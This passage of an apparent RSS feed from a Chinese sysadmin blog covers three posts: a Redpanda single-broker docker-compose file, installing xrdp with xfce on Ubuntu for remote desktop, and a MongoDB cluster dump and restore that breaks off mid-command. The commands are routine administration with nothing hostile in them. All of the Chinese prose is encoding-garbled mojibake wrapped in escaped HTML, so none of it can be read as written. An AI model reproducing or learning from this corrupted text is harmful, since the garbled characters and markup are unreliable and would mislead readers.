&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Redis çš„å¹³æ›¿ Dragonfly
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Mongo çš„å¹³æ›¿ FerretDB
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Kafka çš„å¹³æ›¿ Redpanda
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;é‚£å°±é€‰å®šç”¨&lt;code&gt;Redpanda&lt;/code&gt;æ¥æï¼Œæ–¹æ³•è¿˜æ˜¯æœ‰ä¸€äº›æ›²æŠ˜çš„ï¼š&lt;/p&gt;
&lt;p&gt;Redpanda åœ¨ 2025å¹´5æœˆ16æ—¥è¿™ä¸ªèŠ‚ç‚¹ï¼Œæœ‰5ä¸ªç‰ˆæœ¬&lt;/p&gt;
&lt;p&gt;&lt;img alt=&#34;image-20250516151644197&#34; loading=&#34;lazy&#34; src=&#34;https://rendoumi.com/posts/20250516-redpanda/image-20250516151644197.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;æœ€æ–°çš„25.1çš„ç‰ˆæœ¬ï¼Œå¦‚æœç”¨docker composeæ¥å¯åŠ¨ï¼Œæ˜¯ä¸ªå‹ç¼©åŒ…ï¼Œå¥½å¤šæ–‡ä»¶ã€‚&lt;/p&gt;
&lt;p&gt;æ•°æ®ç›˜æœ‰ä¸‰ä¸ªäº†ï¼Œè€Œä¸”ç”¨åˆ°äº†minioåšåç«¯çš„æŒä¹…åŒ–å·ï¼Œè¿™ä¹ˆå¤æ‚ï¼Œé‚£ä¸å¦‚ç›´æ¥æKafkaäº†&lt;/p&gt;
&lt;p&gt;é‚£åªèƒ½å¾€å‰å›é€€ï¼Œé€‰ç”¨24.2çš„ç‰ˆæœ¬ï¼Œdocker compose å°±ä¸€ä¸ªæ–‡ä»¶ï¼Œä¸è¿‡è¿™ä¸ªç‰ˆæœ¬ 2025å¹´7æœˆ31æ—¥å°±ç»ˆç»“æ”¯æŒäº†ã€‚&lt;/p&gt;
&lt;p&gt;ä¸‹è½½çš„è¯ï¼šhttps://docs.redpanda.com/24.2/get-started/quick-start/&lt;/p&gt;
&lt;p&gt;æˆ‘ä»¬è¦çš„æ˜¯ä¸€ä¸ªbrokerçš„ï¼Œé‚£ç›´æ¥ç»™å‡ºæºæ–‡ä»¶&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;name: redpanda-quickstart-one-broker
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;networks:
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  redpanda_network:
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    driver: bridge
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;volumes:
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  redpanda-0: null
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;services:
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  redpanda-0:
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    command:
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;      - redpanda
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;      - start
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;      - --kafka-addr internal://0.0.0.0:9092,external://0.0.0.0:19092
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;      &lt;span class=&#34;c1&#34;&gt;# Address the broker advertises to clients that connect to the Kafka API.&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;      &lt;span class=&#34;c1&#34;&gt;# Use the internal addresses to connect to the Redpanda brokers&amp;#39;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;      &lt;span class=&#34;c1&#34;&gt;# from inside the same Docker network.&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;      &lt;span class=&#34;c1&#34;&gt;# Use the external addresses to connect to the Redpanda brokers&amp;#39;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;      &lt;span class=&#34;c1&#34;&gt;# from outside the Docker network.&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;      - --advertise-kafka-addr internal://redpanda-0:9092,external://localhost:19092
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;      - --pandaproxy-addr internal://0.0.0.0:8082,external://0.0.0.0:18082
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;      &lt;span class=&#34;c1&#34;&gt;# Address the broker advertises to clients that connect to the HTTP Proxy.&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;      - --advertise-pandaproxy-addr internal://redpanda-0:8082,external://localhost:18082
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;      - --schema-registry-addr internal://0.0.0.0:8081,external://0.0.0.0:18081
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;      &lt;span class=&#34;c1&#34;&gt;# Redpanda brokers use the RPC API to communicate with each other internally.&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;      - --rpc-addr redpanda-0:33145
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;      - --advertise-rpc-addr redpanda-0:33145
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;      &lt;span class=&#34;c1&#34;&gt;# Mode dev-container uses well-known configuration properties for development in containers.&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;      - --mode dev-container
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;      &lt;span class=&#34;c1&#34;&gt;# Tells Seastar (the framework Redpanda uses under the hood) to use 1 core on the system.&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;      - --smp &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;      - --default-log-level&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;info
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    image: docker.redpanda.com/redpandadata/redpanda:v25.1.4
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    container_name: redpanda-0
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    volumes:
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;      - redpanda-0:/var/lib/redpanda/data
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    networks:
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;      - redpanda_network
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    ports:
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;      - 18081:18081
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;      - 18082:18082
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;      - 19092:19092
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;      - 19644:9644
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  console:
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    container_name: redpanda-console
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    image: docker.redpanda.com/redpandadata/console:v3.1.0
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    networks:
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;      - redpanda_network
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    entrypoint: /bin/sh
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    command: -c &lt;span class=&#34;s1&#34;&gt;&amp;#39;echo &amp;#34;$$CONSOLE_CONFIG_FILE&amp;#34; &amp;gt; /tmp/config.yml; /app/console&amp;#39;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    environment:
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;      CONFIG_FILEPATH: /tmp/config.yml
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;      CONSOLE_CONFIG_FILE: &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        kafka:
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;          brokers: &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;redpanda-0:9092&amp;#34;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        schemaRegistry:
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;          enabled: &lt;span class=&#34;nb&#34;&gt;true&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;          urls: &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;http://redpanda-0:8081&amp;#34;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        redpanda:
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;          adminApi:
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;            enabled: &lt;span class=&#34;nb&#34;&gt;true&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;            urls: &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;http://redpanda-0:9644&amp;#34;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    ports:
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;      - 8080:8080
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    depends_on:
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;      - redpanda-0
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;ä»”ç»†çœ‹äº†ä¸€ä¸‹ï¼Œè¿™é‡Œé¢æœ‰é—®é¢˜ï¼Œå·æ˜¯ç©ºçš„ï¼Œè¿™å¯ä¸è¡Œï¼Œå¿…é¡»æŒä¹…åŒ–åˆ°æœ¬åœ°ï¼Œæ”¹ä¸€ä¸‹&lt;/p&gt;</description>
    </item>
    <item>
      <title>Ubuntu å¦‚ä½•å®‰è£…è¿œç¨‹æ¡Œé¢RDP</title>
      <link>https://rendoumi.com/posts/20250516-ubuntu_rdp/</link>
      <pubDate>Fri, 16 May 2025 09:01:11 +0800</pubDate>
      <guid>https://rendoumi.com/posts/20250516-ubuntu_rdp/</guid>
      <description>&lt;p&gt;éå¸¸éƒé—·çš„ä¸€ä»¶äº‹ã€‚å…¬å¸çš„ç½‘ç»œæ¶æ„éå¸¸æœ‰æ„æ€ï¼Œçµæ´»æ€§æå¤§ã€‚å¯¼è‡´æˆ‘è¿™ä¸ªæ€»åœ¨å…¬å¸ä¹‹å¤–ç”¨&lt;code&gt;openvpn&lt;/code&gt;è¿è¿›å»çš„äººå¾ˆç—›è‹¦ï¼Œæ— æ³•å¤ç°åŒäº‹æå‡ºçš„é—®é¢˜ã€‚&lt;/p&gt;
&lt;p&gt;æ²¡åŠæ³•ï¼Œéœ€è¦åœ¨å…¬å¸ç½‘ç»œå†…éƒ¨æœ‰å°æµ‹è¯•æœºï¼Œé‚£å®é™…æ˜¯æœ‰å¾ˆå¤šçš„ï¼Œä½†éƒ½æ˜¯debianæˆ–è€…ubuntuçš„ï¼Œè€Œé—®é¢˜ååæ˜¯ç½‘é¡µæ‰“ä¸å¼€çš„é—®é¢˜ã€‚&lt;/p&gt;
&lt;p&gt;é‚£å°±å¹²è„†æ‰¾ä¸€å°Ubuntuï¼Œå®‰è£…ä¸€ä¸‹è¿œç¨‹æ¡Œé¢ï¼Œç”¨RDP 3389è¿è¿›å»ï¼Œå¯åŠ¨ä¸€ä¸ªFirefoxï¼Œè¿›è¡Œæµ‹è¯•å³å¯ã€‚&lt;/p&gt;
&lt;p&gt;æ­¥éª¤å¦‚ä¸‹ï¼š&lt;/p&gt;
&lt;p&gt;ä¸€ã€å‡çº§ubuntuåˆ°æœ€æ–°&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;sudo apt update
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;sudo apt upgrade -y
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;äºŒã€å®‰è£…xrdp&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;sudo apt install xrdp -y
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;ä¸‰ã€å®‰è£…æ¡Œé¢ç¯å¢ƒxfce&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;sudo apt install xfce4 xfce4-goodies -y
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;å››ã€é…ç½®xfceä½¿ç”¨xrdp&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nb&#34;&gt;echo&lt;/span&gt; xfce4-session &amp;gt; ~/.xsession
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;# å°†æœ€åä¸€è¡Œæ›¿æ¢æ‰&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;sudo vi /etc/xrdp/startwm.sh
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;#exec /bin/sh /etc/X11/Xsession&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nb&#34;&gt;exec&lt;/span&gt; startxfce4
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;img alt=&#34;image-20250516102445030&#34; loading=&#34;lazy&#34; src=&#34;https://rendoumi.com/posts/20250516-ubuntu_rdp/image-20250516102445030.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;äº”ã€è®¾ç½®xrdpæœåŠ¡è‡ªå¯åŠ¨&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;sudo systemctl &lt;span class=&#34;nb&#34;&gt;enable&lt;/span&gt; xrdp
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;sudo systemctl start xrdp
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;å…­ã€å¦‚æœæœ‰é˜²ç«å¢™ï¼Œè®°å¾—æ”¾å¼€3389çš„tcpç«¯å£&lt;/p&gt;
&lt;p&gt;ä¸ƒã€æŠŠç”¨æˆ·åŠ å…¥ssl-certç»„&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;# è¿™é‡Œæˆ‘çš„ç™»å½•ç”¨æˆ·æ˜¯debian&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;sudo adduser debian ssl-cert
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;# åŠ ç»„ä¸ç”¨é‡å¯ï¼Œå¦‚æœ‰å…¶å®ƒæ”¹åŠ¨éœ€è¦é‡å¯&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;sudo systemctl restart xrdp
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;å…«ã€å®‰è£…Firefox&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;sudo apt install firefox-esr
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;ä¹ã€å¼€è¿œç¨‹æ¡Œé¢ï¼Œè¿ä¸Šå»ï¼Œå¼€ä¸ªå‘½ä»¤è¡Œæ‰§è¡Œ&lt;code&gt;firefox-esr&lt;/code&gt;&lt;/p&gt;</description>
    </item>
    <item>
      <title>mongodb é›†ç¾¤çš„æ¢å¤</title>
      <link>https://rendoumi.com/posts/20250512-mongodb-restore/</link>
      <pubDate>Mon, 12 May 2025 09:01:11 +0800</pubDate>
      <guid>https://rendoumi.com/posts/20250512-mongodb-restore/</guid>
      <description>&lt;p&gt;è¦åšä¸€ä¸ªmongodbé›†ç¾¤çš„è¿ç§»å’Œæ¢å¤ï¼ŒçœŸæ˜¯æŠ˜è…¾æ­»äººäº†ã€‚è®°å½•å¹¶é¡ºä¾¿åæ§½ä¸€ä¸‹ï¼š&lt;/p&gt;
&lt;p&gt;mongodbçš„toolsçœŸçš„æ˜¯å¤ªç®€æ˜“ã€ç²—ç³™ã€ä¸‘é™‹äº†ã€‚&lt;/p&gt;
&lt;p&gt;çº¿ä¸Šçš„æºæ•°æ®åº“æ˜¯è…¾è®¯çš„æœåŠ¡ï¼Œè¦åºŸå¼ƒæ¬è¿åˆ°å†…ç½‘ï¼Œè¶³è¶³æŠ˜è…¾äº†ä¸€ä¸ªæ˜ŸæœŸã€‚&lt;/p&gt;
&lt;p&gt;çº¿ä¸Šæºæ•°æ®åº“ç¯å¢ƒå¦‚ä¸‹ï¼š&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;äº‘æ•°æ®åº“ TencentDB&lt;/li&gt;
&lt;li&gt;4C/8GB/500GB&lt;/li&gt;
&lt;li&gt;3èŠ‚ç‚¹&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;äºæ˜¯åœ¨çº¿ä¸‹å¯¹ç­‰å»ºç«‹äº†mongoé›†ç¾¤ï¼ŒåŒæ ·é…ç½®ï¼ŒåŒæ ·3èŠ‚ç‚¹ã€‚&lt;/p&gt;
&lt;p&gt;å™©æ¢¦ç”±æ­¤å¼€å§‹å•Šï¼Œæ³¨æ„çº¿ä¸‹é›†ç¾¤çš„memoryé…ç½®ä¸€å®šè¦é«˜ï¼š&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;32GB&lt;/li&gt;
&lt;li&gt;ç”¨æˆ·åå’Œå¯†ç ä¸€å®šè¦å’Œçº¿ä¸Šå®Œå…¨ä¸€è‡´&lt;/li&gt;
&lt;li&gt;å¦‚æœç”¨æˆ·åå¯†ç ä¸ä¸€è‡´ï¼ŒDocumentæ¢å¤å®Œæ¯•ï¼ŒIndexæ— æ³•å»ºç«‹ï¼Œå› ä¸ºæ˜¯å®Œå…¨æ¢å¤ï¼Œä¼šè¦†ç›–adminè¿™ä¸ªdb&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;ç„¶åå¼€å§‹dumpçº¿ä¸Šæ•°æ®&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;mongodump -vvvvv --uri&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;mongodb://root:xxxxxxxx@10.1.2.3:27017/?authSource=admin&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;ç„¶åç”Ÿæˆä¸€ä¸ª24Gå¤§å°å¾—dumpæ–‡ä»¶å¤¹ï¼Œå‹ç¼©å2.4Gï¼Œä¼ è¾“åˆ°çº¿ä¸‹åº“ä¸Šå‡†å¤‡æ¢å¤&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;# å¤§é‡æ¢å¤å¿…é¡»æ‰©å¤§æ–‡ä»¶å¥æŸ„ï¼Œå¦åˆ™è¿‡ä¸å»&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nb&#34;&gt;ulimit&lt;/span&gt; -n &lt;span class=&#34;m&#34;&gt;655360&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;# ä¸€å®šè¦è®°å½•ä¸‹æ¥å¼€å§‹çš„æ—¶é—´æˆ³ï¼Œåé¢æœ‰ç”¨&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;date
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Sun May &lt;span class=&#34;m&#34;&gt;11&lt;/span&gt; 06:34:02 PM CST &lt;span class=&#34;m&#34;&gt;2025&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;# å¼€å§‹æ¢å¤ï¼Œæ¼«é•¿çš„ä¸€å¤©å¼€å§‹äº†&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;# å¿…é¡»æ”¾åˆ°screenä¸­æ‰§è¡Œï¼Œå¦åˆ™ç½‘ç»œä¸å¥½ï¼Œæ–­äº†ä¹Ÿä¼šå¾ˆæ‚²å‰§&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;screen -L
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;./mongorestore &lt;span class=&#34;se&#34;&gt;\
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;se&#34;&gt;&lt;/span&gt;   --drop &lt;span class=&#34;se&#34;&gt;\
